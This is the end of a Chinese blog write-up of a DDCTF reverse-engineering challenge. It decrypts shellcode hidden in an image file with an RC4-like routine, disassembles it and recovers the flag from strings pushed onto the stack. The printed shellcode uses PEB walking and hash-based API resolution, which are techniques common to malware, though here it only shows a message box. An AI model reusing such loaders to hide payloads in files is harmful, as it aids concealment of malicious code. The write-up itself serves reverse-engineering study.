<p>然后根据数组和图片数据生成新数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">f = open(&quot;x.jpg&quot;,&quot;r&quot;)</span><br><span class="line">data = f.read()</span><br><span class="line">new_data = [&quot;&quot; for x in range(len(data))]</span><br><span class="line">for x in xrange(len(data)):</span><br><span class="line">    arr2[0]=(arr2[0]+1)%256</span><br><span class="line">    arr2[1]=(arr2[arr2[0]+8]+arr2[1])%256</span><br><span class="line">    v4 = arr2[arr2[0]+8]</span><br><span class="line">    v5 = arr2[arr2[1]+8]</span><br><span class="line">    arr2[arr2[0]+8] = v5</span><br><span class="line">    arr2[arr2[1]+8] = v4</span><br><span class="line">    new_data[x] = ((arr2[(v5+v4)%256+8]^ord(data[x]))&amp;0xff^x)&amp;0xff</span><br><span class="line"></span><br><span class="line">for x in range(len(new_data)):</span><br><span class="line">    print hex(new_data[x]),</span><br><span class="line"></span><br><span class="line">out：</span><br><span class="line">0xee 0x55 0xd 0x59 0xd9 0xeb 0x9b 0xd9 0x74 0x24 0xf4 0x31 0xd2 0xb2 0x77 0x31 0xc9 0x64 0x8b 0x71 0x30 0x8b 0x76 0xc 0x8b 0x76 0x1c 0x8b 0x46 0x8 0x8b 0x7e 0x20 0x8b 0x36 0x38 0x4f 0x18 0x75 0xf3 0x59 0x1 0xd1 0xff 0xe1 0x60 0x8b 0x6c 0x24 0x24 0x8b 0x45 0x3c 0x8b 0x54 0x28 0x78 0x1 0xea 0x8b 0x4a 0x18 0x8b 0x5a 0x20 0x1 0xeb 0xe3 0x34 0x49 0x8b 0x34 0x8b 0x1 0xee 0x31 0xff 0x31 0xc0 0xfc 0xac 0x84 0xc0 0x74 0x7 0xc1 0xcf 0xd 0x1 0xc7 0xeb 0xf4 0x3b 0x7c 0x24 0x28 0x75 0xe1 0x8b 0x5a 0x24 0x1 0xeb 0x66 0x8b 0xc 0x4b 0x8b 0x5a 0x1c 0x1 0xeb 0x8b 0x4 0x8b 0x1 0xe8 0x89 0x44 0x24 0x1c 0x61 0xc3 0xb2 0x8 0x29 0xd4 0x89 0xe5 0x89 0xc2 0x68 0x8e 0x4e 0xe 0xec 0x52 0xe8 0x9f 0xff 0xff 0xff 0x89 0x45 0x4 0xbb 0x7e 0xd8 0xe2 0x73 0x87 0x1c 0x24 0x52 0xe8 0x8e 0xff 0xff 0xff 0x89 0x45 0x8 0x68 0x6c 0x6c 0x20 0x41 0x68 0x33 0x32 0x2e 0x64 0x68 0x75 0x73 0x65 0x72 0x30 0xdb 0x88 0x5c 0x24 0xa 0x89 0xe6 0x56 0xff 0x55 0x4 0x89 0xc2 0x50 0xbb 0xa8 0xa2 0x4d 0xbc 0x87 0x1c 0x24 0x52 0xe8 0x5f 0xff 0xff 0xff 0x68 0x58 0x20 0x20 0x20 0x68 0x72 0x61 0x74 0x73 0x68 0x43 0x6f 0x6e 0x67 0x31 0xdb 0x88 0x5c 0x24 0x8 0x89 0xe3 0x68 0x63 0x6f 0x6d 0x58 0x68 0x69 0x6e 0x67 0x2e 0x68 0x63 0x68 0x75 0x78 0x68 0x64 0x69 0x64 0x69 0x68 0x61 0x64 0x65 0x40 0x68 0x64 0x39 0x65 0x39 0x68 0x37 0x31 0x37 0x33 0x68 0x64 0x34 0x61 0x65 0x68 0x64 0x36 0x39 0x62 0x68 0x62 0x31 0x63 0x34 0x68 0x61 0x64 0x61 0x63 0x68 0x63 0x34 0x39 0x62 0x68 0x54 0x46 0x2d 0x63 0x68 0x20 0x44 0x44 0x43 0x68 0x4b 0x65 0x79 0x3a 0x31 0xc9 0x88 0x4c 0x24 0x3b 0x89 0xe1 0x31 0xd2 0x52 0x53 0x51 0x52 0xff 0xd0 0x31 0xc0 0x50 0xff 0x55 0x8</span><br></pre></td></tr></table></figure></p>
<p>然后用一个神器AsmToMachineCode.exe：<br>现将数据转成\x表示的十六进制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xee\x55\xd\x59\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b\x71\x30\x8b\x76\xc\x8b\x76\x1c\x8b\x46\x8\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x1\xd1\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x1\xea\x8b\x4a\x18\x8b\x5a\x20\x1\xeb\xe3\x34\x49\x8b\x34\x8b\x1\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x7\xc1\xcf\xd\x1\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x1\xeb\x66\x8b\xc\x4b\x8b\x5a\x1c\x1\xeb\x8b\x4\x8b\x1\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x8\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\xe\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x4\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89\x45\x8\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\xa\x89\xe6\x56\xff\x55\x4\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52\xe8\x5f\xff\xff\xff\x68\x58\x20\x20\x20\x68\x72\x61\x74\x73\x68\x43\x6f\x6e\x67\x31\xdb\x88\x5c\x24\x8\x89\xe3\x68\x63\x6f\x6d\x58\x68\x69\x6e\x67\x2e\x68\x63\x68\x75\x78\x68\x64\x69\x64\x69\x68\x61\x64\x65\x40\x68\x64\x39\x65\x39\x68\x37\x31\x37\x33\x68\x64\x34\x61\x65\x68\x64\x36\x39\x62\x68\x62\x31\x63\x34\x68\x61\x64\x61\x63\x68\x63\x34\x39\x62\x68\x54\x46\x2d\x63\x68\x20\x44\x44\x43\x68\x4b\x65\x79\x3a\x31\xc9\x88\x4c\x24\x3b\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x8</span><br></pre></td></tr></table></figure></p>
<p>然后使用工具转成汇编代码：<br><img src="https://s2.ax1x.com/2019/03/22/A8hKNn.png" alt><br>我靠，这工具有点东西啊，对不对</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">call 003FFFA4</span><br><span class="line">mov [ebp+65],eax</span><br><span class="line">mov ebx,73E2D87E</span><br><span class="line">xchg [esp],ebx</span><br><span class="line">push edx</span><br><span class="line">call 003FFF93</span><br><span class="line">mov [ebp-5B],eax</span><br><span class="line">push 41206C6C</span><br><span class="line">push 642E3233</span><br><span class="line">push 72657375</span><br><span class="line">xor bl,bl</span><br><span class="line">mov [esp-3B],bl</span><br><span class="line">mov esi,esp</span><br><span class="line">push esi</span><br><span class="line">call [ebp+65]</span><br><span class="line">mov edx,eax</span><br><span class="line">push eax</span><br><span class="line">mov ebx,BC4DA2A8</span><br><span class="line">xchg [esp],ebx</span><br><span class="line">push edx</span><br><span class="line">call 003FFF64</span><br><span class="line">push 20202058</span><br><span class="line">push 73746172</span><br><span class="line">push 676E6F43</span><br><span class="line">xor ebx,ebx</span><br><span class="line">mov [esp-5B],bl</span><br><span class="line">mov ebx,esp</span><br><span class="line">push 586D6F63</span><br><span class="line">push 2E676E69</span><br><span class="line">push 78756863</span><br><span class="line">push 69646964</span><br><span class="line">push 40656461</span><br><span class="line">push 39653964</span><br><span class="line">push 33373137</span><br><span class="line">push 65613464</span><br><span class="line">push 62393664</span><br><span class="line">push 34633162</span><br><span class="line">push 63616461</span><br><span class="line">push 62393463</span><br><span class="line">push 632D4654</span><br><span class="line">push 43444420</span><br><span class="line">push 3A79654B</span><br><span class="line">xor ecx,ecx</span><br><span class="line">mov [esp+3B],cl</span><br><span class="line">mov ecx,esp</span><br><span class="line">xor edx,edx</span><br><span class="line">push edx</span><br><span class="line">push ebx</span><br><span class="line">push ecx</span><br><span class="line">push edx</span><br><span class="line">call eax</span><br><span class="line">xor eax,eax</span><br><span class="line">push eax</span><br><span class="line">call [ebp+49]</span><br></pre></td></tr></table></figure>
<p>发现有一段push，压入栈中一些数据，那么我们把数据提取出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data = [&quot;586D6F63&quot;,&quot;2E676E69&quot;,&quot;78756863&quot;,&quot;69646964&quot;,&quot;40656461&quot;,&quot;39653964&quot;,&quot;33373137&quot;,&quot;65613464&quot;,&quot;62393664&quot;,&quot;34633162&quot;,&quot;63616461&quot;,&quot;62393463&quot;,&quot;632D4654&quot;,&quot;43444420&quot;,&quot;3A79654B&quot;]</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for x in range(len(data)):</span><br><span class="line">	for y in range(len(data[x])-2,-2,-2):</span><br><span class="line">		flag += chr(eval(&quot;0x&quot;+data[len(data)-1-x][y:y+2]))</span><br><span class="line">print flag</span><br><span class="line"></span><br><span class="line">out：</span><br><span class="line">Key: DDCTF-cc49badacb1c4d69bd4ae7173d9e9ade@didichuxing.comX</span><br></pre></td></tr></table></figure></p>
<p>flag是去掉最后的X。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过这么长时间的做题发现，只要耐心的找到关键代码，再把关键代码看的通透，那么flag的离得不远了。</p>

        
        <br>
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
        本站总访问量<span id="busuanzi_value_site_pv"></span>次
       </p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
